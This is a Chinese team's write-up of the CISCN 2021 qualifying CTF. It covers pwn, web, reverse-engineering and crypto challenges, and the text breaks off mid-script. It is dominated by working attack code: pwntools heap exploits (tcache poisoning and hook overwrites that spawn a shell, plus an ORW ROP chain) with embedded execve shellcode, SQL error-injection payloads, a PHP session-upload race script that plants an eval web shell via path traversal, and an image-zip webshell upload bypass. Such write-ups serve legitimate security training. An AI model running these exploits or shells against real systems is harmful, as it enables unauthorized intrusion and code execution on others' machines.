> 原文链接: https://www.anquanke.com//post/id/241807 


# CISCN2021 初赛wp by fr3e


                                阅读量   
                                **125073**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01af826e5e8b5938a8.png)](https://p4.ssl.qhimg.com/t01af826e5e8b5938a8.png)



大家好，我们是fr3e战队，上周打了国赛，最后排名26（华中4），各大高校的各位大师傅们tql。下面是fr3e的wp，希望和各位大师傅们交流。仓促整理，有错误直接issue，dalao们轻喷 ：p

## pwn

### <a class="reference-link" name="wolf"></a>wolf

UAF 2.27 打tcache的管理结构

之后打hook

```
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.terminal=['tmux', 'splitw', '-h']
prog = './lonelywolf'
#elf = ELF(prog)
# p = process(prog)#,env=`{`"LD_PRELOAD":"./libc-2.27.so"`}`)
libc = ELF("./libc-2.27.so")
p = remote("124.71.227.203", 26116)
def debug(addr,PIE=True): 
    debug_str = ""
    if PIE:
        text_base = int(os.popen("pmap `{``}`| awk '`{``{`print $1`}``}`'".format(p.pid)).readlines()[1], 16) 
        for i in addr:
            debug_str+='b *`{``}`\n'.format(hex(text_base+i))
        gdb.attach(p,debug_str) 
    else:
        for i in addr:
            debug_str+='b *`{``}`\n'.format(hex(text_base+i))
        gdb.attach(p,debug_str) 

def dbg():
    gdb.attach(p)
#-----------------------------------------------------------------------------------------
s = lambda data :p.send(str(data))#in case that data is an int
sa= lambda delim,data :p.sendafter(str(delim), str(data)) 
sl= lambda data :p.sendline(str(data)) 
sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) 
r = lambda numb=4096:p.recv(numb)
ru= lambda delims, drop=True  :p.recvuntil(delims, drop)
it= lambda:p.interactive()
uu32= lambda data   :u32(data.ljust(4, '\0'))
uu64= lambda data   :u64(data.ljust(8, '\0'))
bp= lambda bkp:pdbg.bp(bkp)
li= lambda str1,data1 :log.success(str1+'========&gt;'+hex(data1))


def dbgc(addr):
    gdb.attach(p,"b*" + hex(addr) +"\n c")

def lg(s,addr):
print('\033[1;31;40m%20s--&gt;0x%x\033[0m'%(s,addr))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

choice="Your choice: "


def add(size,c='a'):  #
ru(choice)
sl('1')
ru("Index: ")
sl('0')
ru("Size: ")
sl(str(size))


def delete():
ru(choice)
sl('4')
ru("Index: ")
sl('0')


def edit(c):
ru(choice)
sl('2')
ru("Index: ")
sl('0')
ru("Content: " )  
sl(c)  

def show():
ru(choice)
sl('3')
ru("Index: ")
sl('0')
ru("Content: ")

def exp():
    add(0x78)
    delete()
    # delete()
    edit('wi1laaaaa')
    delete()
    show()
    # ru("Content: ")
    data = uu64(r(6))
    heap = data - 0x260
    lg('heap',heap)
    #-----------------------------
    edit(p64(heap+0x10))
    add(0x78)
    add(0x78)
    edit('\x07'*0x40)
    delete()
    show()
    data  = uu64(ru('\x7f',drop=False)[-6:])
    lg('data',data)
    addr = data -0x3ebca0
    free_hook=addr+libc.sym['__free_hook']
    sys_addr=addr+libc.sym['system']
    lg('addr',addr)
    edit('\x01'*0x40+p64(free_hook-8))
    add(0x10)
    edit('/bin/sh\x00'+p64(sys_addr))
    delete()

    # dbg()

    it()
if __name__ == '__main__':
    exp()
```

### <a class="reference-link" name="pwny"></a>pwny

两次write(0x200)

可以泄露bss地址同时造成任意地址写

```
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.terminal=['tmux', 'splitw', '-h']
prog = './pwny'
#elf = ELF(prog)
# p = process(prog)#,env=`{`"LD_PRELOAD":"./libc-2.27.so"`}`)
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
p = remote("124.71.227.203", 26219)
def debug(addr,PIE=True): 
    debug_str = ""
    if PIE:
        text_base = int(os.popen("pmap `{``}`| awk '`{``{`print $1`}``}`'".format(p.pid)).readlines()[1], 16) 
        for i in addr:
            debug_str+='b *`{``}`\n'.format(hex(text_base+i))
        gdb.attach(p,debug_str) 
    else:
        for i in addr:
            debug_str+='b *`{``}`\n'.format(hex(text_base+i))
        gdb.attach(p,debug_str) 

def dbg():
    gdb.attach(p)
#-----------------------------------------------------------------------------------------
s = lambda data :p.send(str(data))#in case that data is an int
sa= lambda delim,data :p.sendafter(str(delim), str(data)) 
sl= lambda data :p.sendline(str(data)) 
sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) 
r = lambda numb=4096:p.recv(numb)
ru= lambda delims, drop=True  :p.recvuntil(delims, drop)
it= lambda:p.interactive()
uu32= lambda data   :u32(data.ljust(4, '\0'))
uu64= lambda data   :u64(data.ljust(8, '\0'))
bp= lambda bkp:pdbg.bp(bkp)
li= lambda str1,data1 :log.success(str1+'========&gt;'+hex(data1))


def dbgc(addr):
    gdb.attach(p,"b*" + hex(addr) +"\n c")

def lg(s,addr):
print('\033[1;31;40m%20s--&gt;0x%x\033[0m'%(s,addr))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def a_read(idx,con='\n'):
sla("Your choice: ",'1')
sla("Index: ",str(idx))
sla('Content:',con)
def a_write(idx):
sla("Your choice: ",'2')
sla("Index: ",str(idx))



def exp():
    a_write(0)
    a_write(0x100)
    # a_read(1)

    a_write(0x100)

    # s(1)
    # a_read(str(0xfffffffc)
    sla("Your choice: ",'1')
    sa("Index: ",p64(0xffffffffffffffe0/8))
    # a_write(2)
    ru("Result: ")
    data = int(r(12),16)
    lg('data',data)
    addr = data - 0x7f7d41c07680 + 0x7f7d4181b000
    lg('addr',addr)

    sla("Your choice: ",'1')
    sa("Index: ",p64(0xffffffffffffffa8/8))
    ru("Result: ")
    data = int(r(12),16)
    bss = data - 8
    lg('bss',bss)
    str_jmp = addr - 0x7fb8da338000 + 0x7fb8da720360
    og = addr + 0x10a41c
    #------------------------------------------------
    mh = addr + libc.sym['__malloc_hook']
    rh = addr +  libc.sym['realloc']
    off = (mh - bss - 0x60)/8
    off2 = (mh -bss - 0x60-8)/8
    # debug([0xB4C,0xBF6])
    a_write(off)
    s(p64(rh+4))
    lg('mh',mh)

    a_write(off2)
    s(p64(og))
    lg('og',og)
    sla("Your choice: ",'1'*0x500)

    # dbg()
#     s(p64(0x00000000fbad2887))
#     data = addr + 0x00007f0db0da97e3 - 0x7f0db09bd000
#     for i in range(1,8):
#         a_write(i)
#         s(p64(data))
#     a_write(8)
#     s(p64(data+1))
#     data2 = 0x00007f4deee96a00 + addr - 0x7f4deeaab000
#     data3 = 0x00007f4deee988c0 + addr - 0x7f4deeaab000
#     data4 = 0x00007f4deee968c0 + addr - 0x7f4deeaab000
#     for i in range(4):
#         a_write(9+i)
#         s(p64(0))
#     a_write(13)
#     s(p64(data2))

#     a_write(14)
#     s(p64(1))


#     a_write(15)
#     s(p64(0xffffffffffffffff))
#     a_write(16)
#     s(p64(0x000000000a000000))
#     a_write(17)
#     s(p64(data3))
#     a_write(18)
#     s(p64(0xffffffffffffffff))
#     a_write(19)
#     s(p64(0))
#     a_write(20)
#     s(p64(data4))
#     a_write(21)
#     s(p64(0))
#     a_write(22)
#     s(p64(0))
#     a_write(23)
#     s(p64(0))

#     a_write(24)
#     s(p64(0x00000000ffffffff))    
#     a_write(25)
#     s(p64(0))
#     a_write(26)
#     s(p64(0))
#     a_write(27)
#     s(p64(str_jmp+8))

# #--------------------------
#     a_write(0xffffffffffffffc0/8)
#     s(p64(bss+0x60))

    it()
if __name__ == '__main__':
    exp()
#   │0x7f4deee97760 &lt;_IO_2_1_stdout_&gt;: 0x00000000fbad28870x00007f4deee977e3
#   │0x7f4deee97770 &lt;_IO_2_1_stdout_+16&gt;:0x00007f4deee977e30x00007f4deee977e3
#   │0x7f4deee97780 &lt;_IO_2_1_stdout_+32&gt;:0x00007f4deee977e30x00007f4deee977e3
#   │0x7f4deee97790 &lt;_IO_2_1_stdout_+48&gt;:0x00007f4deee977e30x00007f4deee977e3
#   │0x7f4deee977a0 &lt;_IO_2_1_stdout_+64&gt;:0x00007f4deee977e40x0000000000000000
# │`│0x7f4deee977b0 &lt;_IO_2_1_stdout_+80&gt;:0x00000000000000000x0000000000000000
# ··│0x7f4deee977c0 &lt;_IO_2_1_stdout_+96&gt;:0x00000000000000000x00007f4deee96a00
# ·││0x7f4deee977d0 &lt;_IO_2_1_stdout_+112&gt;:   0x00000000000000010xffffffffffffffff
# cU│0x7f4deee977e0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a0000000x00007f4deee988c0
# ··│0x7f4deee977f0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff0x0000000000000000
# │ │0x7f4deee97800 &lt;_IO_2_1_stdout_+160&gt;:   0x00007f4deee968c00x0000000000000000
#   │0x7f4deee97810 &lt;_IO_2_1_stdout_+176&gt;:   0x00000000000000000x0000000000000000
#   │0x7f4deee97820 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff0x0000000000000000
# 00│0x7f4deee97830 &lt;_IO_2_1_stdout_+208&gt;:   0x00000000000000000x00007f4deee932a0
```

### <a class="reference-link" name="silverwolf"></a>silverwolf

新版2.27 漏洞UAF

ORW

```
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.terminal=['tmux', 'splitw', '-h']
prog = './silverwolf'
#elf = ELF(prog)
# p = process(prog)#,env=`{`"LD_PRELOAD":"./libc-2.27.so"`}`)
libc = ELF("./libc-2.27.so")
p = remote("124.71.227.203", 26158)
def debug(addr,PIE=True): 
    debug_str = ""
    if PIE:
        text_base = int(os.popen("pmap `{``}`| awk '`{``{`print $1`}``}`'".format(p.pid)).readlines()[1], 16) 
        for i in addr:
            debug_str+='b *`{``}`\n'.format(hex(text_base+i))
        gdb.attach(p,debug_str) 
    else:
        for i in addr:
            debug_str+='b *`{``}`\n'.format(hex(text_base+i))
        gdb.attach(p,debug_str) 

def dbg():
    gdb.attach(p)
#-----------------------------------------------------------------------------------------
s = lambda data :p.send(str(data))#in case that data is an int
sa= lambda delim,data :p.sendafter(str(delim), str(data)) 
sl= lambda data :p.sendline(str(data)) 
sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) 
r = lambda numb=4096:p.recv(numb)
ru= lambda delims, drop=True  :p.recvuntil(delims, drop)
it= lambda:p.interactive()
uu32= lambda data   :u32(data.ljust(4, '\0'))
uu64= lambda data   :u64(data.ljust(8, '\0'))
bp= lambda bkp:pdbg.bp(bkp)
li= lambda str1,data1 :log.success(str1+'========&gt;'+hex(data1))


def dbgc(addr):
    gdb.attach(p,"b*" + hex(addr) +"\n c")

def lg(s,addr):
print('\033[1;31;40m%20s--&gt;0x%x\033[0m'%(s,addr))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

choice="Your choice: "


def add(size,c='a'):  #
ru(choice)
sl('1')
ru("Index: ")
sl('0')
ru("Size: ")
sl(str(size))


def delete():
ru(choice)
sl('4')
ru("Index: ")
sl('0')


def edit(c):
ru(choice)
sl('2')
ru("Index: ")
sl('0')
ru("Content: " )  
sl(c)  

def show():
ru(choice)
sl('3')
ru("Index: ")
sl('0')
ru("Content: ")

def exp():
    add(0x78)
    delete()
    # delete()
    # edit('wi1laaaaa')
    # delete()
    show()
    # ru("Content: ")
    data = uu64(r(6))
    heap = data - 0x260 - 0xf10
    lg('heap',heap)
    # #-----------------------------
    # sla(choice,'1'*0x500)
    # add(0x50)
    # for i in range(7):
    #     add(0x60)
    # delete()
    edit(p64(heap+0x10))
    add(0x78)
    add(0x78)
    edit('\x07'*0x40)
    delete()
    show()
    data  = uu64(ru('\x7f',drop=False)[-6:])
    lg('data',data)
    addr = data -0x3ebca0
    free_hook=addr+libc.sym['__free_hook']
    sys_addr=addr+libc.sym['system']
    sx = addr + libc.sym['setcontext']+53
    lg('addr',addr)

    fake = '\x01'+'\x01'*3
    fake = fake.ljust(0x40,'\x01')
    edit(fake+p64(free_hook)+p64(heap+0xdb0)+p64(heap+0xdf0)+p64(heap+0xe10)+p64(heap+0xe50)+p64(heap+0xf68)+p64(heap+0xf68))
    #----------
    ret = addr + 0x0000000000006388
    pop_rdi = addr + 0x00000000000215bf
    pop_rsi = addr + 0x0000000000023eea
    pop_rdx = addr + 0x0000000000001b96
    read_m = addr + libc.sym['read']
    write_m = addr + libc.sym['write']
    syscall = addr + 0x00000000000d2745
    pop_rax = addr + 0x0000000000043ae8
    add_ret = addr +0x000000000003efcd
    open_m = addr + libc.sym['open']
    # add(0x10)
    # pay = 'a'*8+p64(sx)
    # # pay = pay.ljust(0x)
    # edit(pay)
    # # delete()
    # #---------
    # for i in  range(1):
    #     add(0x40)
    # add(0x10)
    add(0x10)
    pay =p64(sx)
    edit(pay)

    add(0x50)
    edit(p64(heap+0xe10)+p64(ret)+p64(pop_rdi))


    rop = p64(pop_rdi)+p64(heap+0xdf0)+p64(pop_rsi)+p64(0) 
    # rop+= p64(open_m)
    rop+= p64(pop_rax)+p64(2)+p64(syscall)
    rop+= p64(add_ret)    
    # +p64(3)
    # +p64(pop_rsi)+p64(heap+0x500)+p64(pop_rdx)+p64(0x20)+p64(read)
    add(0x40)
    edit(rop)

    add(0x70)
    rop2 = p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap+0x500)+p64(pop_rdx)+p64(0x30)+p64(read_m)
    rop2+= p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap+0x500)+p64(pop_rdx)+p64(0x30)+p64(write_m)

    edit(rop2)

    add(0x30)
    edit('./flag\x00')
    add(0x20)
    edit(p64(ret))


    # add(0x40)
    # dbg()
    lg('sx',sx)

    # debug([0xEA9])
    delete()
    it()
if __name__ == '__main__':
    exp()
```



## web

### <a class="reference-link" name="web1%20easy_sql%E6%B3%A8%E5%85%A5"></a>web1 easy_sql注入

payload

```
uname=admin&amp;passwd=a')/**/and/**/updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b)c),0x7e),1)%23&amp;Submit=%E7%99%BB%E5%BD%95
```

‘)闭合，然后 报错注入。猜测得到有一个表叫flag。发现过滤了information等系统库

根据[http://www.wupco.cn/?p=4117](http://www.wupco.cn/?p=4117)

```
uname=admin&amp;passwd=a')/**/and/**/updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b)c),0x7e),1)%23&amp;Submit=%E7%99%BB%E5%BD%95
```

```
uname=admin&amp;passwd=a')/**/and/**/updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c),0x7e),1)%23&amp;Submit=%E7%99%BB%E5%BD%95
```

爆出列名1

```
uname=admin&amp;passwd=a')/**/and/**/updatexml(1,concat(0x7e,(reverse(select `f30f48fe-6b1b-41e8-96eb-c297827bc695` from flag)),0x7e),1)%23&amp;Submit=%E7%99%BB%E5%BD%95
```

然后substr切割一下 还有后半段

### <a class="reference-link" name="web2%20source"></a>web2 source

扫描后台 .index.swo

发现是原题[https://r0yanx.com/2020/10/28/fslh-writeup/](https://r0yanx.com/2020/10/28/fslh-writeup/)

直接上payload

```
/?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment
```

### <a class="reference-link" name="web3%20middle_source"></a>web3 middle_source

扫描后台 /.listing

发现了 youcanseeeeeeee.php 是个phpinfo界面

[![](https://p0.ssl.qhimg.com/t01469bce4ddb45b904.png)](https://p0.ssl.qhimg.com/t01469bce4ddb45b904.png)

然后读取到session的存储位置，写出脚本。

```
# coding=utf-8
import io
import requests
import threading

sessid = 'flag'
data = `{`"cmd": "var_dump(readfile('/etc'));"`}`
url = "靶机"

def write(session):
while True:
f = io.BytesIO(b'a' * 1024 * 50)
resp = session.post(url,
data=`{`'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST["cmd"]);?&gt;'`}`,
files=`{`'file': ('tgao.txt', f)`}`, cookies=`{`'PHPSESSID': sessid`}`)


def read(session):
while True:
data["cf"] = "../../../../../var/lib/php/sessions/if/sess_flag"#phpinfo中的位置
resp = session.post(url,data=data)
if 'tgao.txt' in resp.text:
print(resp.text)
event.clear()
else:
pass


if __name__ == "__main__":
event = threading.Event()
with requests.session() as session:
for i in range(1, 30):
threading.Thread(target=write, args=(session,)).start()

for i in range(1, 30):
threading.Thread(target=read, args=(session,)).start()
event.set()
```

很快就能找到位置 出flag

### <a class="reference-link" name="web3%20upload"></a>web3 upload

一上来就是图片马的二次渲染绕过，然后结合example.php后面我们知道，这里还要一zip来配合使用，达到的目的就是解压后有shell。

然后我们不慌不忙的掏出我们的图片马 ，再把他打包成压缩包。 然后现在要绕过对于zip的绕过。上传解压马儿就可以了。

这里对于zip的绕过

[https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/](https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/)

```
图片马的最后记得加上
#define width 1
#define height 1
```

php-gd2的那个图片马即可，

上传 解压

就在example下面 然后flag

[![](https://p5.ssl.qhimg.com/t01346604b6bea8344c.png)](https://p5.ssl.qhimg.com/t01346604b6bea8344c.png)

还得重新读一下。



## re

### <a class="reference-link" name="glass"></a>glass

使用native层方法checkflag，先经过RC4，再经过另一个流加密，密钥都是12345678<br>
还原第二个流加密：

```
#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

void decode(BYTE* out, BYTE* key)
`{`
    for (int i = 0;i &lt; 39;i++)
        out[i] ^= key[i % 8];

    for (int i = 0; i &lt; 39; i += 3)
    `{`
        BYTE v1 = out[i + 1] ^ out[i];
        BYTE v2 = out[i + 2] ^ out[i + 1] ^ out[i];
        BYTE v0 = out[i] ^ v2;
        out[i] = v0;
        out[i + 1] = v1;
        out[i + 2] = v2;
    `}`
`}`

void main()
`{`
    BYTE key[] = "12345678";
    BYTE cipher[39] = `{` 0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 0xAD, 0xAD, 0x9E, 0x96, 0x05, 0x02, 0x1F, 0x8E, 0x36, 0x4F, 0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 0x6E, 0x3F, 0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F `}`;

    decode(cipher, key);
    for (size_t i = 0; i &lt; 39; i++)
        printf("\\x%02X", cipher[i]);
`}`
```

再解密RC4：

```
from Crypto.Cipher import ARC4

key = b"12345678"
target = b"\xF8\xBA\x6A\x97\x47\xCA\xE8\x91\xC5\x07\x6E\xF7\x92\x0B\x39\x92\x14\xA8\xAF\x7E\xAA\x50\x45\x8D\x6D\x2D\xB6\x86\x6E\x9F\x86\x5E\xDF\xB3\x1E\x52\xA6\x62\x6A"

rc4 = ARC4.new(key)
print(rc4.decrypt(target).decode())
```

### <a class="reference-link" name="baby_bc"></a>baby_bc

llc先汇编成baby.s，再gcc静态链接成elf。<br>
ida分析后得知在填写5*5的数独，对于行与行之间、列与列之间的大小关系分别由col与row数组规定，对于行来说，控制字节为1时a&gt;b，控制字节为2时a&lt;b；对于列来说，控制字节为1时a&lt;b，控制字节为2时a&gt;b。<br>
最后的map填写出来应该是这样的：<br>
1, 4, 2, 5, 3,<br>
5, 3, 1, 4, 2,<br>
3, 5, 4, 2, 1,<br>
2, 1, 5, 3, 4,<br>
4, 2, 3, 1, 5

原map给了两个值，输入的时候对应字节应该是0，得到输入序列1425353142350212150442315，md5得到flag

crypto<br>
imageencrypt<br>
先把testimage和加密后的直接异或可以得到key1和key2的值<br>
反推出bins，然后截取还原出x数列<br>
在0.1到3.0之间搜索r的值,发现1.2满足,然后反解x0<br>
得到后续的x数列就可以还原图像了

```
import random
from hashlib import *
r=1.2
def generate(x):
    return round(r*x*(3-x),6)


def encrypt(pixel,key1,key2,x0,m,n):
    num = m*n//8    
    seqs = []
    x = x0
    bins = ''
    tmp = []
    for i in range(num):
        x = generate(x)
        tmp.append(x)
        seqs.append(int(x*22000))
    for x in seqs:
        bin_x  = bin(x)[2:]
        if len(bin_x) &lt; 16:
            bin_x = '0'*(16-len(bin_x))+bin_x
        bins += bin_x
    assert(len(pixel) == m*n)
    cipher = [ 0 for i in range(m) for j in range(n)]
    for i in range(m):
        for j in range(n):
            index = n*i+j
            ch = int(bins[2*index:2*index+2],2)
            pix = pixel[index]
            if ch == 0:
                pix = (pix^key1)&amp;0xff
            if ch == 1:
                pix = (~pix^key1)&amp;0xff
            if ch == 2:
                pix = (pix^key2)&amp;0xff
            if ch == 3:
                pix = (~pix^key2)&amp;0xff
            cipher[index] = pix 
    return cipher
k1=169
k2=78
x=2.159736
tmp=[]
bins=''
flag=[136, 62, 185, 178, 49, 197, 213, 2, 251, 5, 178, 24, 142, 87, 151, 2, 198, 218, 15, 151, 74, 80, 235, 156, 39, 95, 35, 98, 83, 221, 45, 106, 103, 2, 216, 120, 68, 182, 140, 224, 170, 154, 117, 191, 170, 103, 98, 118, 58, 46, 175, 128, 240, 52, 228, 101, 247, 177, 125, 39, 101, 154, 246, 39, 100, 251, 244, 23, 23, 71, 172, 145, 123, 174, 79, 243, 61, 143, 24, 25, 144, 118, 181, 126, 49, 237, 182, 20, 115, 42, 36, 80, 0, 21, 255, 191, 152, 172, 240, 174, 101, 91, 57, 62, 187, 207, 82, 46, 238, 234, 4, 164, 171, 142, 128, 132, 234, 26, 105, 153, 165, 30, 167, 76, 203, 232, 218, 82, 247, 214, 247, 15, 8, 156, 139, 27, 3, 180, 224, 252, 194, 158, 77, 178, 248, 136, 193, 247, 92, 55, 196, 189, 67, 35, 185, 48, 215, 179, 179, 225, 132, 148, 9, 138, 103, 227, 140, 61, 89, 217, 229, 99, 215, 63, 100, 133, 222, 139, 81, 15, 149, 236, 168, 7, 102, 176, 173, 240, 149, 70, 244, 23, 243, 248, 208, 6, 156, 241, 12, 62, 45, 49, 136, 168, 187, 217, 70, 142, 94, 227, 122, 92, 209, 177, 195, 217, 218, 105, 41, 157, 66, 119, 67, 31, 130, 120, 52, 32, 18, 49, 34, 17, 145, 170, 89, 38, 27, 102, 52, 42, 65, 161, 182, 114, 194, 205, 16, 53, 139, 167, 115, 92, 87, 210, 95, 44, 210, 63, 158, 223, 183, 161, 91, 36, 201, 53, 92, 222, 105, 246, 80, 94, 170, 10, 132, 110, 0, 151, 77, 91, 209, 110, 100, 206, 195, 88, 103, 183, 7, 98, 163, 42, 44, 115, 82, 184, 200, 122, 56, 188, 106, 159, 221, 166, 213, 81, 162, 64, 116, 213, 43, 32, 5, 223, 135, 182, 64, 54, 111, 218, 126, 75, 92, 205, 231, 15, 8, 66, 34, 52, 115, 246, 96, 227, 92, 211, 76, 204, 217, 20, 239, 144, 139, 90, 136, 142, 197, 83, 43, 96, 248, 76, 17, 70, 13, 49, 18, 69, 95, 31, 198, 181, 32, 119, 253, 42, 73, 70, 106, 29, 38, 20, 232, 108, 244, 219, 72, 144, 109, 146, 32, 250, 83, 99]
pixel=[198, 143, 247, 3, 152, 139, 131, 84, 181, 180, 252, 177, 192, 25, 217, 179, 136, 107, 190, 62, 4, 6, 90, 53, 105, 238, 117, 44, 5, 116, 132, 195, 214, 171, 113, 209, 18, 31, 194, 174, 228, 212, 196, 14, 27, 41, 211, 56, 139, 135, 225, 214, 89, 122, 178, 212, 185, 231, 204, 150, 204, 212, 160, 142, 213, 173, 186, 166, 65, 238, 5, 32, 45, 31, 25, 189, 148, 38, 78, 79, 33, 56, 227, 48, 103, 163, 31, 189, 37, 124, 106, 249, 86, 188, 86, 233, 41, 250, 89, 7, 212, 234, 111, 104, 245, 102, 227, 96, 160, 67, 181, 13, 26, 192, 214, 210, 188, 84, 216, 215, 243, 72, 233, 2, 122, 166, 107, 251, 70, 128, 94, 190, 185, 210, 34, 85, 77, 29, 182, 77, 115, 208, 228, 252, 73, 198, 151, 70, 10, 97, 138, 235, 21, 117, 239, 102, 129, 2, 253, 80, 53, 61, 184, 220, 41, 82, 37, 140, 23, 143, 179, 53, 153, 113, 213, 211, 111, 197, 248, 65, 60, 69, 1, 81, 48, 254, 251, 89, 195, 8, 93, 190, 66, 174, 97, 175, 210, 191, 66, 112, 123, 128, 33, 230, 237, 104, 16, 192, 239, 173, 44, 10, 120, 231, 114, 151, 140, 63, 103, 44, 243, 222, 242, 73, 51, 46, 98, 137, 163, 152, 147, 95, 223, 3, 15, 112, 85, 215, 133, 131, 240, 239, 224, 195, 140, 124, 70, 156, 221, 241, 37, 245, 1, 99, 9, 157, 99, 150, 47, 118, 225, 16, 13, 141, 135, 99, 18, 119, 63, 160, 6, 247, 27, 68, 45, 199, 86, 193, 252, 21, 135, 32, 42, 103, 114, 241, 49, 249, 182, 52, 18, 155, 157, 61, 4, 246, 158, 52, 118, 242, 195, 54, 139, 232, 100, 31, 11, 233, 58, 100, 101, 137, 83, 145, 209, 7, 241, 96, 57, 148, 207, 29, 237, 124, 177, 166, 161, 20, 116, 122, 61, 71, 46, 82, 18, 157, 253, 130, 112, 66, 94, 57, 221, 243, 222, 192, 147, 5, 130, 201, 174, 26, 160, 16, 188, 103, 187, 11, 238, 182, 144, 4, 137, 33, 84, 100, 7, 239, 219, 83, 112, 189, 166, 58, 93, 141, 30, 198, 220, 196, 118, 172, 5, 45]
data = ''.join(map(chr,flag))
print(md5.new(data).hexdigest())
print(encrypt(flag,k1,k2,x,24,16)==pixel)
for i in range(48):
    x = generate(x)
    tmp.append(int(x*22000))
for x in tmp:
        bin_x  = bin(x)[2:]
        if len(bin_x) &lt; 16:
            bin_x = '0'*(16-len(bin_x))+bin_x
        bins += bin_x
# print(bins)
pixel=[198, 143, 247, 3, 152, 139, 131, 84, 181, 180, 252, 177, 192, 25, 217, 179, 136, 107, 190, 62, 4, 6, 90, 53, 105, 238, 117, 44, 5, 116, 132, 195, 214, 171, 113, 209, 18, 31, 194, 174, 228, 212, 196, 14, 27, 41, 211, 56, 139, 135, 225, 214, 89, 122, 178, 212, 185, 231, 204, 150, 204, 212, 160, 142, 213, 173, 186, 166, 65, 238, 5, 32, 45, 31, 25, 189, 148, 38, 78, 79, 33, 56, 227, 48, 103, 163, 31, 189, 37, 124, 106, 249, 86, 188, 86, 233, 41, 250, 89, 7, 212, 234, 111, 104, 245, 102, 227, 96, 160, 67, 181, 13, 26, 192, 214, 210, 188, 84, 216, 215, 243, 72, 233, 2, 122, 166, 107, 251, 70, 128, 94, 190, 185, 210, 34, 85, 77, 29, 182, 77, 115, 208, 228, 252, 73, 198, 151, 70, 10, 97, 138, 235, 21, 117, 239, 102, 129, 2, 253, 80, 53, 61, 184, 220, 41, 82, 37, 140, 23, 143, 179, 53, 153, 113, 213, 211, 111, 197, 248, 65, 60, 69, 1, 81, 48, 254, 251, 89, 195, 8, 93, 190, 66, 174, 97, 175, 210, 191, 66, 112, 123, 128, 33, 230, 237, 104, 16, 192, 239, 173, 44, 10, 120, 231, 114, 151, 140, 63, 103, 44, 243, 222, 242, 73, 51, 46, 98, 137, 163, 152, 147, 95, 223, 3, 15, 112, 85, 215, 133, 131, 240, 239, 224, 195, 140, 124, 70, 156, 221, 241, 37, 245, 1, 99, 9, 157, 99, 150, 47, 118, 225, 16, 13, 141, 135, 99, 18, 119, 63, 160, 6, 247, 27, 68, 45, 199, 86, 193, 252, 21, 135, 32, 42, 103, 114, 241, 49, 249, 182, 52, 18, 155, 157, 61, 4, 246, 158, 52, 118, 242, 195, 54, 139, 232, 100, 31, 11, 233, 58, 100, 101, 137, 83, 145, 209, 7, 241, 96, 57, 148, 207, 29, 237, 124, 177, 166, 161, 20, 116, 122, 61, 71, 46, 82, 18, 157, 253, 130, 112, 66, 94, 57, 221, 243, 222, 192, 147, 5, 130, 201, 174, 26, 160, 16, 188, 103, 187, 11, 238, 182, 144, 4, 137, 33, 84, 100, 7, 239, 219, 83, 112, 189, 166, 58, 93, 141, 30, 198, 220, 196, 118, 172, 5, 45]
res=[]
for i in range(24):
    for j in range(16):
        index = 16*i+j
        ch = int(bins[2*index:2*index+2],2)
        pix = pixel[index]
        if ch == 0:
            pix = (pix^k1)&amp;0xff
        if ch == 1:
            pix = ~(pix^k1)&amp;0xff
        if ch == 2:
